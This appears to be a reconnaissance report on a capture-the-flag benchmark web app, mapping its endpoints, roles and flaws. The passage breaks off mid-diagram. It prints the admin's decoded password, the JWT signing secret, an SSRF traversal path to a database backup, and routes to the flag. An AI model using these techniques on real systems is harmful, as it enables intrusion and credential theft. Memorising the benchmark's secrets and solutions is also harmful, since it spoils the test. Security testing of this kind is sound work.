# Reconnaissance Deliverable: Manapool NFT Digital Art Investment Platform

## 0) HOW TO READ THIS

This reconnaissance report provides a comprehensive map of the Manapool application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

---

## 1. Executive Summary

**Target Application:** XBEN-084-24 - Manapool NFT Digital Art Investment Platform  
**URL:** http://localhost:36327  
**Architecture Type:** Containerized microservices web application with Next.js frontend  
**Overall Security Posture:** **CRITICAL RISK**

Manapool is a Next.js 14-based NFT/digital art investment platform comprising three containerized services: a Next.js frontend application, a mock S3 storage service (s3rver), and an Nginx reverse proxy. The application presents a **critically vulnerable attack surface** with multiple high-severity security flaws that pose immediate risk of complete system compromise.

**Core Technologies:**
- **Frontend Framework:** Next.js 14.2.3 with React 18
- **Backend Language:** Node.js 20 (TypeScript 5.x)
- **Database:** SQLite 3 (file-based at `/app/db/manapool.db`)
- **Authentication:** JWT tokens (jsonwebtoken 9.0.2) with 1-hour expiration
- **Session Management:** Client-side cookies (js-cookie 3.0.5)
- **Object Storage:** s3rver 3.7.1 (S3-compatible mock server)
- **Reverse Proxy:** Nginx (Alpine Linux)
- **Container Orchestration:** Docker Compose

**Critical Findings:**

The most alarming vulnerability is the **complete absence of cryptographic password hashing**—user passwords are merely Base64-encoded, making them trivially reversible by any attacker with database access. The password for the master administrative account (will.rogers@manapool.com, uid: 9666) is stored as `Tm9FTlZNeGpHSzNOM2tH`, which decodes to `NoENVMxjGK3N3kG` in seconds.

Additionally, the application's JWT authentication system uses a **hardcoded secret key committed to version control** (`2kI0Zu7N6ptVPDurCTfqBGVCd+qpaSFO6m4/20SCZQU=`), enabling any attacker with repository access to forge authentication tokens and impersonate any user, including the master admin.

A **critical Server-Side Request Forgery (SSRF) vulnerability** exists in the S3 proxy endpoint (`/api/s3/[slug]`), which accepts completely unvalidated user input and directly interpolates it into server-side fetch calls. This allows attackers to access internal services and potentially retrieve the **unencrypted database backup** stored in the S3 service at `/backups/manapool.db`.

**Attack Surface Summary:**
- **8 HTTP endpoints** (3 API routes, 5 page routes)
- **1 S3 API endpoint** (with SSRF vulnerability)
- **1 master admin account** (isMaster=1)
- **4 standard user accounts** (isMaster=0)
- **No middleware-based authentication/authorization controls**
- **No rate limiting on any endpoints**

**Positive Security Controls:**
- All SQL queries use parameterized prepared statements (no SQL injection)
- React 18's automatic JSX escaping provides baseline XSS protection
- Input sanitization via `xss` and `validator` libraries on authentication endpoint

**Critical Vulnerabilities:**
- Base64 password "encoding" instead of cryptographic hashing
- JWT secret in version control
- SSRF vulnerability in S3 proxy endpoint
- Unencrypted database backup exposed via S3
- Missing cookie security flags (httpOnly, secure, sameSite)
- JWT tokens transmitted in URL query parameters
- Client-side only logout (no server-side revocation)
- Wildcard CORS configuration (`allowedOrigins: ["*"]`)
- No security headers (CSP, HSTS, X-Frame-Options)

**CTF Objective:** The flag is displayed on `/adminpanel/profile` page, accessible only when `isMaster=1`. Multiple high-probability attack paths exist: JWT forgery using the exposed secret, credential reversal from the database backup, or privilege escalation through authorization flaws.

---

## 2. Technology & Service Map

### Frontend

**Framework:** Next.js 14.2.3 (React 18-based full-stack framework)
- **Routing:** Hybrid App Router + Pages Router architecture
  - App Router: UI pages and Server Components (`/app` directory)
  - Pages Router: API endpoints (`/pages/api` directory)
- **Server Actions:** Enabled with wildcard CORS (`allowedOrigins: ["*"]`)
- **Runtime:** Node.js 20 Alpine Linux container
- **Build System:** npm with TypeScript 5.x strict mode

**Key Frontend Libraries:**
- `jsonwebtoken@9.0.2` - JWT signing and verification (HS256 algorithm)
- `axios@1.7.2` - HTTP client for API requests
- `js-cookie@3.0.5` - Client-side cookie manipulation (no httpOnly support)
- `validator@13.12.0` - Email normalization and string escaping
- `xss@1.0.15` - XSS filtering
- `iron-session@8.0.1` - Installed but unused (dead dependency)
- `sqlite3@5.1.7` - SQLite database driver
- `react@18.2.0` - UI rendering with automatic JSX escaping

**Database:** SQLite 3
- **File Location:** `/app/db/manapool.db` (644 permissions - world-readable)
- **Backup Location:** `/s3/buckets/backups/manapool.db._S3rver_object` (unencrypted)
- **Schema:** Single `users` table with 5 user records
- **Connection Pattern:** Singleton pattern with parameterized queries

### Backend

**Language/Framework:** Node.js 20 with TypeScript 5.x
- **API Pattern:** RESTful JSON APIs via Next.js Pages Router
- **Port:** 3000 (internal only, not externally exposed)
- **Authentication:** JWT-based with Base64-encoded passwords
- **Authorization:** Binary role flag (`isMaster`: 0 or 1)

**Key Dependencies:**
- `next@14.2.3` - Full-stack framework
- `sqlite3@5.1.7` - Database driver with prepared statement support
- `jsonwebtoken@9.0.2` - JWT authentication

### Infrastructure

**Hosting/Orchestration:** Docker Compose with 3 containerized services
- **Network Architecture:** Two Docker networks (default + internal)
- **Container Base Image:** Alpine Linux (minimal attack surface)
- **Health Checks:** All services monitored (10-30 second intervals)

**Reverse Proxy:** Nginx (Alpine Linux)
- **External Ports:** 80 (HTTP frontend), 8333 (S3 proxy)
- **Configuration:** `/nginx/nginx.conf`
- **Security Controls:** HTTP method filtering on S3 endpoint, body size limits (8MB)
- **Missing Controls:** No security headers, no WAF, no rate limiting

**Object Storage:** s3rver 3.7.1 (S3-compatible mock server)
- **Technology:** Koa.js-based S3 API implementation
- **Port:** 8333 (exposed externally through Nginx)
- **Buckets:**
  - `/assets` - 8 public image files
  - `/backups` - Complete database backup (unencrypted)
- **Authentication:** None configured
- **Access Control:** Nginx-level HTTP method restrictions only (GET/HEAD/OPTIONS allowed externally)

**CDN:** None detected

### Identified Subdomains

From subfinder scan (all resolve to localhost):
- `server02.counterintel.localhost`
- `fndlync01.5ninesdata.localhost`
- `autodiscover.localhost`
- `owa.regency.localhost`
- `tools.sonoma.edu.localhost`
- `naeu2.naeuinc.localhost`
- `mail.localhost`
- `mail03.regency.localhost`
- `mail.regency.localhost`
- `server2.hunter.localhost`
- `exchvm.nwcnet.localhost`
- `www.localhost`
- `mse-ca-mail.corp.mse.localhost`
- `autodiscover.regency.localhost`
- `mail02.regency.localhost`
- `sbs.allsaintsschool.localhost`

**Note:** These subdomains appear to be DNS artifacts from local development environment. The target application only responds on `localhost:36327`.

### Open Ports & Services

From nmap scan of localhost:
- **Port 80** - Caddy httpd (likely development server, not the target)
- **Port 443** - SSL/HTTPS (not used by target application)
- **Port 631** - CUPS 2.3 (printer service, out of scope)
- **Port 4567** - Puma web server (Ruby/Sinatra "Text Generator" app, separate application)
- **Port 7777** - SimpleHTTPServer 0.6 (Python 3.12.10, development server)
- **Port 9999** - SimpleHTTPServer 0.6 (Python 3.12.10, development server)
- **Port 49158** - Tailscale service (VPN, requires auth)

**Target Application Port:** 36327 (proxied through Nginx from internal port 3000)

---

## 3. Authentication & Session Management Flow

### Entry Points

| Entry Point | Method | Authentication Required | Description |
|-------------|--------|------------------------|-------------|
| `/adminpanel` | GET | No (login page) | Admin panel login interface |
| `/api/auth` | POST | No (public endpoint) | Credential submission and JWT generation |
| `/logout` | GET | No (client-side only) | Session termination (cookie removal) |

### Mechanism

**Step-by-Step Authentication Flow:**

1. **User Navigation** (`/adminpanel`)
   - **File:** `/frontend/app/adminpanel/page.tsx:6-19`
   - User accesses admin login page
   - Page checks for existing token via `cookies().get("token")`
   - If valid token exists, redirects to `/adminpanel/profile`
   - Otherwise, displays LoginForm component

2. **Credential Submission** (POST `/api/auth`)
   - **File:** `/frontend/app/components/LoginForm.tsx:23-36`
   - Email and password collected via React form
   - Client sends POST request with JSON body: `{email: string, password: string}`
   - No client-side validation beyond HTML5 `required` attribute

3. **Server-Side Validation** (`/api/auth` handler)
   - **File:** `/frontend/pages/api/auth.ts:15-27`
   - Type checking: Validates `email` and `password` are strings
   - Sanitization:
     - Email: `validator.normalizeEmail(xss(email))` (line 22)
     - Password: `stringToBase64(xss(validator.escape(password)))` (line 23)
   - **CRITICAL FLAW:** Password Base64-encoded, not hashed (lines 7-12)

4. **Database Credential Verification**
   - **File:** `/frontend/app/db/sqlite.tsx:35-45` (signIn function)
   - Query: `SELECT * FROM users WHERE email = ? AND password = ?`
   - **Protection:** Parameterized prepared statements (SQL injection-safe)
   - **Vulnerability:** Compares Base64-encoded password (line 40)
   - Returns 401 if credentials invalid

5. **JWT Token Generation**
   - **File:** `/frontend/pages/api/auth.ts:42-48`
   - Library: `jsonwebtoken@9.0.2`
   - Algorithm: HS256 (symmetric signing)
   - Secret: `process.env.SECRET_KEY` = `"2kI0Zu7N6ptVPDurCTfqBGVCd+qpaSFO6m4/20SCZQU="` (from `.env:1`)
   - Claims: `{uid: string}` (minimal - only user ID)
   - Expiration: 1 hour (`expiresIn: '1h'`)
   - **CRITICAL FLAW:** Secret committed to source control

6. **Token Response**
   - **File:** `/frontend/pages/api/auth.ts:50-54`
   - Response format: `{message: "Done", error: null, token: "eyJ..."}`
   - Token returned in JSON response body (not Set-Cookie header)

7. **Client-Side Cookie Storage**
   - **File:** `/frontend/app/components/LoginForm.tsx:30`
   - Library: `js-cookie@3.0.5` (client-side library)
   - Code: `Cookies.set("token", response.data.token, {expires: 7})`
   - Cookie configuration:
     - Name: `token`
     - Value: JWT string
     - Expiration: 7 days
     - Path: `/` (default)
   - **CRITICAL FLAWS:**
     - ❌ No `httpOnly` flag (impossible with client-side js-cookie)
     - ❌ No `secure` flag
     - ❌ No `sameSite` flag
     - ❌ Cookie lifetime (7 days) exceeds JWT lifetime (1 hour)

8. **Redirect to Protected Area**
   - **File:** `/frontend/app/components/LoginForm.tsx:31`
   - Client-side navigation: `router.push("/adminpanel/profile")`

**Session Validation on Protected Pages:**

1. **Token Extraction**
   - **File:** `/frontend/app/adminpanel/profile/page.tsx:7`
   - Server-side: `const token = cookies().get("token")?.value as string`
   - Extracts token from cookie via Next.js server API

2. **Session Validation Server Action**
   - **File:** `/frontend/app/actions/sessionManager.ts:7-17`
   - Calls: `checkSession(token)`
   - Internal fetch: `GET http://localhost:3000/api/user?token=${token}`
   - **CRITICAL FLAW:** Token in URL query parameter (logged in access logs)

3. **JWT Verification**
   - **File:** `/frontend/pages/api/user.ts:31-33`
   - Code: `jwt.verify(token, secret)`
   - Validates signature, expiration, structure
   - Extracts `uid` from payload

4. **User Data Retrieval**
   - **File:** `/frontend/app/db/sqlite.tsx:47-59` (fetchUser function)
   - Query: `SELECT * FROM users WHERE uid = ?`
   - Returns user object with `name`, `email`, `amount`, `isMaster`
   - **Note:** Password excluded from response (security positive)

5. **Authorization Check**
   - **File:** `/frontend/app/adminpanel/profile/page.tsx:10-12`
   - Redirects to `/adminpanel` if `session.error` exists
   - Passes `isMaster` flag to Profile component

6. **Flag Display Logic**
   - **File:** `/frontend/app/components/Profile.tsx:39-40`
   - Conditional rendering: `{props.isMaster && <p>{flag}</p>}`
   - Flag value: `process.env.FLAG` (line 11)
   - **CTF OBJECTIVE:** Requires `isMaster=1` to view flag

### Code Pointers

**Authentication Core Files:**
- **Login API Handler:** `/frontend/pages/api/auth.ts` (lines 14-63)
- **User Info API Handler:** `/frontend/pages/api/user.ts` (lines 16-59)
- **Database Auth Query:** `/frontend/app/db/sqlite.tsx` (lines 35-45 - signIn function)
- **Database User Query:** `/frontend/app/db/sqlite.tsx` (lines 47-59 - fetchUser function)
- **Session Manager:** `/frontend/app/actions/sessionManager.ts` (lines 7-17)
- **Login Form Component:** `/frontend/app/components/LoginForm.tsx` (lines 23-36)
- **Profile Component:** `/frontend/app/components/Profile.tsx` (lines 37-41)
- **Logout Page:** `/frontend/app/logout/page.tsx` (lines 6-13)

**Configuration Files:**
- **JWT Secret:** `/frontend/.env` (line 1)
- **Flag Value:** `/frontend/.env` (line 2 - replaced during build)
- **Next.js Config:** `/frontend/next.config.mjs` (lines 7-11 - CORS wildcard)
- **Database Schema:** Embedded in `/frontend/db/manapool.db`

### 3.1 Role Assignment Process

**Role Determination:** Roles are determined by the `isMaster` field (INTEGER) in the `users` database table at authentication time.

**Database Schema:**
```sql
CREATE TABLE IF NOT EXISTS "users" (
    "uid" TEXT,
    "email" TEXT,
    "name" TEXT,
    "password" TEXT,
    "isMaster" INTEGER,
    "amount" INTEGER
);
```

**Role Assignment Flow:**
1. User authenticates via POST `/api/auth` with email/password
2. Database query returns user record including `isMaster` field
3. JWT token generated with only `uid` claim (not role)
4. On subsequent requests, `/api/user` endpoint queries database to fetch `isMaster`
5. Role retrieved fresh from database on every session validation

**Default Role:** Not applicable - no user registration functionality exists. All 5 users are pre-seeded in the database with fixed roles.

**Role Upgrade Path:** 
- **Current Implementation:** No API or UI for role modification
- **Method:** Direct database modification only
- **SQL Command:** `UPDATE users SET isMaster = 1 WHERE uid = '<target>'`
- **Authorization Required:** Database access (filesystem or SQL injection)
- **Audit Trail:** None - no logging of role changes

**Code Implementation:**
- **Role Storage:** Database table `users`, field `isMaster` (`/frontend/db/manapool.db`)
- **Role Retrieval:** `/frontend/app/db/sqlite.tsx:47-59` (fetchUser function)
- **No Role Assignment API:** No endpoint or server action to modify `isMaster`

**Existing User Roles:**

| UID | Email | Name | isMaster | Amount (M$) |
|-----|-------|------|----------|-------------|
| 9666 | will.rogers@manapool.com | William Rogers | **1** | 7990 |
| 3789 | nayla.sanches@manapool.com | Nayla Sanches | 0 | 2507 |
| 4890 | murilo.mac@manapool.com | Murilo Mac | 0 | 1991 |
| 6785 | chris.paulman@manapool.com | Christian Paulman | 0 | 4563 |
| 7771 | julia.mattarazo@manapool.com | Julia Mattarazo | 0 | 5783 |

### 3.2 Privilege Storage & Validation

**Storage Location:**
- **Primary:** SQLite database (`/frontend/db/manapool.db`)
  - Table: `users`
  - Field: `isMaster` (INTEGER - 0 or 1)
- **Secondary:** Not stored in JWT claims (only `uid` in token)
- **Cache:** Not cached - retrieved from database on every validation

**Validation Points:**

1. **Admin Panel Access** (`/adminpanel/page.tsx:7-8`)
   - Validates token exists and is valid JWT
   - Does NOT check `isMaster` at this stage
   - Any authenticated user can proceed

2. **Profile Page Access** (`/adminpanel/profile/page.tsx:7-8`)
   - Validates token via `checkSession()` server action
   - Retrieves `isMaster` from database via `/api/user` endpoint
   - Does NOT block rendering based on `isMaster` (authorization flaw)

3. **Flag Display** (`/app/components/Profile.tsx:39-40`)
   - Client-side conditional rendering based on `props.isMaster`
   - Only validation point for actual privilege enforcement
   - **VULNERABILITY:** Trust boundary issue - component trusts API data

**Validation Implementation Files:**
- **Session Check:** `/frontend/app/actions/sessionManager.ts:7-17`
- **User API:** `/frontend/pages/api/user.ts:31-46`
- **Database Query:** `/frontend/app/db/sqlite.tsx:50-52`

**Cache/Session Persistence:**
- **Duration:** No persistence - fetched on every request
- **Refresh:** Real-time from database (no caching layer)
- **Session Store:** None - stateless JWT authentication
- **Implication:** Database role changes take effect immediately (no cache invalidation needed)

### 3.3 Role Switching & Impersonation

**Impersonation Features:** ❌ Not implemented

**Role Switching:** ❌ Not implemented

**Sudo Mode:** ❌ Not implemented

**Code Implementation:** No files found implementing impersonation or role switching functionality.

**Audit Trail:** ❌ No logging system exists for authentication or authorization events

**Security Implications:**
- No risk of impersonation feature abuse (doesn't exist)
- No audit trail means role changes in database go undetected
- No logging of successful/failed authentication attempts
- No monitoring of unusual access patterns

---

## 4. API Endpoint Inventory

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| POST | `/api/auth` | anon | None | None | **Authentication endpoint.** Validates credentials, generates JWT token. Input sanitization: xss + validator. Password stored as Base64 (not hashed). Returns JWT with 1hr expiry. **File:** `/frontend/pages/api/auth.ts:14-63` |
| GET | `/api/user` | user | `uid` (in JWT) | Bearer Token (query param) + JWT verify | **User information retrieval.** Validates JWT signature, extracts uid, queries database, returns user object with `isMaster` flag. **VULNERABILITY:** Token in query string (logged). **File:** `/frontend/pages/api/user.ts:16-59` |
| GET | `/api/s3/[slug]` | anon | `slug` (filename) | None | **S3 image proxy.** Fetches images from internal S3 service. **CRITICAL SSRF:** No input validation on slug parameter. Direct interpolation into fetch URL. Can access `/backups/manapool.db`. **File:** `/frontend/pages/api/s3/[slug].ts:2-28` |
| GET | `/` | anon | None | None | **Home page.** Displays marketing content and NFT art gallery. Loads images via S3 proxy. **File:** `/frontend/app/page.tsx:4-42` |
| GET | `/team` | anon | None | None | **Team directory page.** Displays 5 team member profiles with images. Public information disclosure. **File:** `/frontend/app/team/page.tsx:3-48` |
| GET | `/adminpanel` | anon | None | Session check (inline) | **Admin login page.** Checks for existing valid token, redirects to profile if authenticated. Otherwise displays login form. **File:** `/frontend/app/adminpanel/page.tsx:6-19` |
| GET | `/adminpanel/profile` | user | None | Session check (inline) + `isMaster` for flag | **Admin profile page (FLAG LOCATION).** Validates JWT token, retrieves user data, displays profile. Flag visible only if `isMaster=1`. **VULNERABILITY:** Authorization check done in React component, not middleware. **File:** `/frontend/app/adminpanel/profile/page.tsx:6-27` |
| GET | `/logout` | anon | None | None | **Logout page (client-side only).** Removes token cookie via js-cookie. **CRITICAL FLAW:** No server-side session invalidation. JWT remains valid until expiration. **File:** `/frontend/app/logout/page.tsx:6-13` |

**Key for Authorization Mechanisms:**
- **None:** Public endpoint, no authentication required
- **Bearer Token (query param):** JWT passed as `?token=...` URL parameter
- **Session check (inline):** Server component validates token via `checkSession()` server action
- **JWT verify:** Token signature verified with `jsonwebtoken.verify()`

**Object ID Parameter Risk Assessment:**
- **`uid` (in JWT):** HIGH RISK - Can forge JWT with different uid using exposed secret
- **`slug` (filename):** CRITICAL RISK - SSRF vulnerability, can access internal services

---

## 5. Potential Input Vectors for Vulnerability Analysis

### URL Parameters

| Parameter | Endpoint | File:Line | Validation | Dangerous Sink | Notes |
|-----------|----------|-----------|------------|----------------|-------|
| `token` | `GET /api/user` | `user.ts:23` | JWT signature verification | SQL query (uid from JWT) | **CRITICAL:** Token in URL (logged in access logs, browser history). Should use Authorization header. Reaches database query at `sqlite.tsx:50` (parameterized - safe). |

### POST Body Fields (JSON)

| Field | Endpoint | File:Line | Validation/Sanitization | Dangerous Sink | Notes |
|-------|----------|-----------|-------------------------|----------------|-------|
| `email` | `POST /api/auth` | `auth.ts:16,22` | Type check (18), `xss()` + `validator.normalizeEmail()` (22) | SQL query (signIn) | Reaches database at `sqlite.tsx:38-40` (parameterized - safe). |
| `password` | `POST /api/auth` | `auth.ts:16,23` | Type check (18), `validator.escape()` + `xss()` + Base64 encode (23) | SQL query (signIn) | **CRITICAL:** Base64 encoded, not hashed. Reaches database at `sqlite.tsx:38-40` (parameterized - safe from injection, vulnerable to reversal). |

### HTTP Headers

**Analysis Result:** No custom HTTP headers are processed by the application.

**Standard Headers:**
- `Content-Type` - Set by client, not processed as user input
- `Authorization` - Not used (should be used for token transmission)
- `Host` - Set by Nginx proxy, not processed by application logic

### Cookie Values

| Cookie | Read Location | File:Line | Validation | Purpose | Security Issues |
|--------|---------------|-----------|------------|---------|-----------------|
| `token` | Server components | `page.tsx:7` (adminpanel, profile) | JWT verify via `checkSession()` | Session authentication | **CRITICAL FLAWS:** No httpOnly flag (XSS theft possible), no secure flag (sent over HTTP), no sameSite flag (CSRF possible), 7-day expiry exceeds JWT 1hr expiry. Set at `LoginForm.tsx:30`. |

### Path Parameters (Dynamic Route Segments)

| Parameter | Endpoint | File:Line | Validation | Dangerous Sink | Notes |
|-----------|----------|-----------|------------|----------------|-------|
| `[slug]` | `GET /api/s3/[slug]` | `[slug].ts:7` | **NONE** | Server-side fetch (SSRF) | **CRITICAL SSRF VULNERABILITY:** Extracted via `req.url?.split("/").reverse()[0]`, directly interpolated into `fetch(\`http://s3:8333/assets/${image}\`)` at line 11. No sanitization, no path traversal prevention, no allowlist. Can access `/backups/manapool.db` via `../backups/manapool.db`. |

### Complete Input Vector Summary Table

| Input Vector | Type | Endpoint | Processing File:Line | Validation Applied | Dangerous Sink | Protected | Risk Level |
|--------------|------|----------|---------------------|-------------------|----------------|-----------|------------|
| `email` | POST body | `/api/auth` | `auth.ts:22` | xss + normalizeEmail | SQL (signIn) | Yes (parameterized) | Low |
| `password` | POST body | `/api/auth` | `auth.ts:23` | escape + xss + Base64 | SQL (signIn) | Yes (parameterized) | **High (reversible)** |
| `token` | Query param | `/api/user` | `user.ts:23` | JWT verify | SQL (fetchUser) | Yes (parameterized + JWT) | **Critical (logged)** |
| `token` | Cookie | `/adminpanel/*` | `page.tsx:7` | JWT verify (indirect) | SQL (fetchUser) | Yes (JWT + parameterized) | **Critical (no httpOnly)** |
| `slug` | Path param | `/api/s3/[slug]` | `[slug].ts:7` | **NONE** | HTTP fetch (SSRF) | **NO** | **Critical (SSRF)** |

**Key Findings:**
- **Total Input Vectors:** 5 unique network-accessible input vectors
- **Critical Vulnerabilities:** 3 (SSRF, token logging, missing httpOnly)
- **SQL Injection Risk:** 0 (all queries parameterized)
- **Command Injection Risk:** 0 (no command execution)
- **SSRF Risk:** 1 (critical - unvalidated slug parameter)

---

## 6. Network & Interaction Map

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| External User | ExternAsset | Internet | Browser | None | End users accessing the application via web browser |
| Nginx Reverse Proxy | Service | Edge | Nginx/Alpine | Public | External entry point, routes traffic to frontend and S3 services |
| Next.js Frontend | Service | App | Node.js 20/Next.js 14 | PII, Tokens, Secrets | Main application handling authentication, authorization, UI rendering |
| SQLite Database | DataStore | Data | SQLite 3 | PII, Tokens (Base64) | User credentials, profiles, role flags. File: `/app/db/manapool.db` |
| S3 Mock Service | Service | App | Node.js 18/s3rver | Public, Secrets (DB backup) | Object storage for images and database backups |
| S3 Assets Bucket | DataStore | App | Filesystem | Public | 8 image files (team photos, gallery images) |
| S3 Backups Bucket | DataStore | App | Filesystem | PII, Tokens, Secrets | **CRITICAL:** Unencrypted database backup with all user data |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| Nginx Reverse Proxy | Hosts: `http://localhost:36327` (external), `http://nginx:80` (internal); Endpoints: `/*` → frontend:3000, `/api/s3/*` → frontend:3000; S3Proxy: `:8333/*` → s3:8333; Methods: Port 80=all, Port 8333=GET/HEAD/OPTIONS only; Security: Buffer limits (16k headers, 32k large headers, 8MB body), no security headers |
| Next.js Frontend | Hosts: `http://frontend:3000` (internal only); Endpoints: `/api/auth` (POST), `/api/user` (GET), `/api/s3/[slug]` (GET), `/`, `/team`, `/adminpanel`, `/adminpanel/profile`, `/logout`; Auth: JWT (HS256, 1hr expiry); Session: Cookie-based (7-day expiry); Database: Direct filesystem access to `/app/db/manapool.db`; Dependencies: jsonwebtoken, sqlite3, axios, xss, validator; Secrets: JWT_SECRET in .env (committed to git) |
| SQLite Database | Engine: SQLite 3; File: `/app/db/manapool.db`; Permissions: 644 (world-readable); Encryption: None (plaintext); Backup: Full copy in S3 `/backups` bucket; Schema: Single `users` table; Consumers: Next.js Frontend only; Records: 5 users (1 admin, 4 standard) |
| S3 Mock Service | Engine: s3rver 3.7.1 (Koa.js); Port: 8333 (internal + external via Nginx); Buckets: `/assets` (8 files), `/backups` (1 DB file); Auth: None configured; Signature: Disabled; Access: Unrestricted from internal network, GET/HEAD/OPTIONS only from external; Consumers: Next.js Frontend (internal fetch), External Users (via Nginx proxy) |
| S3 Assets Bucket | Path: `/s3/buckets/assets/`; Contents: 8 image files (JPEG); Access: Public read via `/api/s3/[slug]` proxy; Size: ~2-5MB total |
| S3 Backups Bucket | Path: `/s3/buckets/backups/`; Contents: `manapool.db._S3rver_object` (SQLite database), metadata JSON, MD5 hash; **CRITICAL:** Unencrypted backup of entire user database including Base64 passwords; Access: Should be private, but accessible via SSRF through `/api/s3/../backups/manapool.db` |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches | Notes |
|-----------|---------|-----------|--------|---------|-------|
| External User → Nginx Reverse Proxy | HTTPS | `:36327/*` | None | Public | Primary entry point for all external traffic |
| Nginx Reverse Proxy → Next.js Frontend | HTTP | `:3000/*` (internal) | None | Public, PII, Tokens | Proxies all page and API requests to frontend application |
| Nginx Reverse Proxy → S3 Mock Service | HTTP | `:8333/*` (internal) | method:GET/HEAD/OPTIONS | Public | External access to S3 with method restrictions (Nginx enforced) |
| External User → S3 Mock Service (via Nginx) | HTTP | `:8333/*` | method:GET/HEAD/OPTIONS | Public | Users can fetch assets but not upload/delete due to Nginx restrictions |
| Next.js Frontend → SQLite Database | FILE | Local filesystem | None | PII, Tokens, Secrets | Direct file access to `/app/db/manapool.db` (no network isolation) |
| Next.js Frontend → S3 Mock Service | HTTP | `:8333/assets/*` (internal) | None | Public | Unrestricted internal access to all S3 buckets (including `/backups`) |
| Next.js Frontend (SSRF) → S3 Mock Service | HTTP | `:8333/backups/*` (internal) | **VULN: None** | PII, Tokens, Secrets | **CRITICAL FLOW:** SSRF vulnerability allows user-controlled access to database backup via `/api/s3/../backups/manapool.db` |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | No authentication required - public endpoint accessible to any user |
| auth:user | Auth | Requires valid JWT token in cookie. Token validated via `checkSession()` server action which calls `/api/user` endpoint. JWT signature verified using SECRET_KEY. User must exist in database. |
| auth:admin | Authorization | Requires valid JWT token AND `isMaster=1` in database. Checked via client-side conditional rendering in Profile component (`Profile.tsx:39-40`). **VULNERABILITY:** Not enforced via middleware. |
| ownership:user | ObjectOwnership | **NOT IMPLEMENTED** - No object ownership validation exists. Users could access other users' resources if object IDs were exposed in URLs. |
| method:GET/HEAD/OPTIONS | Network | Nginx-level HTTP method restriction on port 8333 (S3 proxy). Denies PUT, POST, DELETE from external sources. Configured via `limit_except` directive. **BYPASSED:** Internal requests from frontend have unrestricted access. |
| vpc-only | Network | Communication restricted to Docker internal network. Frontend and S3 services not directly exposed to external network. |

**Missing Guards:**
- ❌ No rate limiting on any endpoint
- ❌ No CSRF protection (wildcard CORS enabled)
- ❌ No input validation middleware
- ❌ No SQL injection protection beyond parameterized queries
- ❌ No XSS protection beyond React's automatic escaping
- ❌ No session revocation mechanism
- ❌ No concurrent session limit
- ❌ No geo-blocking or IP-based access control

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation | User Count |
|-----------|-----------------|--------------|---------------------|------------|
| Anonymous | 0 | Global | No authentication - public endpoints | N/A |
| Standard User | 1 | Global | `isMaster=0` in database `users` table | 4 users |
| Master Admin | 5 | Global | `isMaster=1` in database `users` table | 1 user |

**Role Details:**

**Anonymous (anon):**
- **Privilege Level:** 0
- **Accessible Endpoints:** `/`, `/team`, `/adminpanel` (login page only), `/api/auth` (login API)
- **Data Access:** Public marketing content, team member names/photos
- **Code:** No specific role object - absence of token cookie

**Standard User:**
- **Privilege Level:** 1
- **Identifier:** `isMaster=0` (integer field in `users` table)
- **Database:** `/frontend/db/manapool.db`
- **Code Implementation:**
  - Stored: Database field `isMaster` (integer 0 or 1)
  - Retrieved: `/frontend/app/db/sqlite.tsx:50-56` (fetchUser function)
  - Checked: `/frontend/app/components/Profile.tsx:39-40` (React conditional rendering)
- **Accessible Endpoints:** All anonymous endpoints plus `/adminpanel/profile`, `/logout`, `/api/user`
- **Data Access:** Own profile data (name, email, balance), public content
- **Restrictions:** Cannot view CTF flag (Profile component checks `isMaster`)

**Master Admin:**
- **Privilege Level:** 5
- **Identifier:** `isMaster=1`
- **Single Account:**
  - UID: `9666`
  - Email: `will.rogers@manapool.com`
  - Name: William Rogers
  - Password (Base64): `Tm9FTlZNeGpHSzNOM2tH` → Decodes to: `NoENVMxjGK3N3kG`
  - Balance: 7990 M$
- **Accessible Endpoints:** All standard user endpoints
- **Data Access:** All standard user data plus CTF flag
- **Special Privileges:** Flag visibility on `/adminpanel/profile` page

**Role Storage Schema:**
```sql
CREATE TABLE IF NOT EXISTS "users" (
    "uid" TEXT,           -- User ID (4-digit string)
    "email" TEXT,         -- Email address (login identifier)
    "name" TEXT,          -- Full name
    "password" TEXT,      -- Base64-encoded password (CRITICAL VULNERABILITY)
    "isMaster" INTEGER,   -- Role flag: 0=Standard User, 1=Master Admin
    "amount" INTEGER      -- Account balance in M$ (Mana Pool dollars)
);
```

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anon → user → admin

Detailed Hierarchy:
┌─────────────────────────────────────────────────────────────┐
│ Level 0: Anonymous                                           │
│ - Public pages (/, /team)                                    │
│ - Login page (/adminpanel)                                   │
│ - Authentication API (POST /api/auth)                        │
│ - Public S3 assets (GET /api/s3/[slug])                      │
└─────────────────────────────────────────────────────────────┘
                          │
                          ▼ (Authenticate via POST /api/auth)
┌─────────────────────────────────────────────────────────────┐
│ Level 1: Standard User (isMaster=0)                         │
│ - All anonymous access                                       │
│ - Profile page (/adminpanel/profile) with restricted view   │
│ - User info API (GET /api/user)                              │
│ - Logout functionality (GET /logout)                         │
│ - Session-protected endpoints                                │
│ - Own profile data (name, email, balance)                    │
│ - NO access to flag                                          │
└─────────────────────────────────────────────────────────────┘
                          │
                          ▼ (Elevate isMaster to 1)
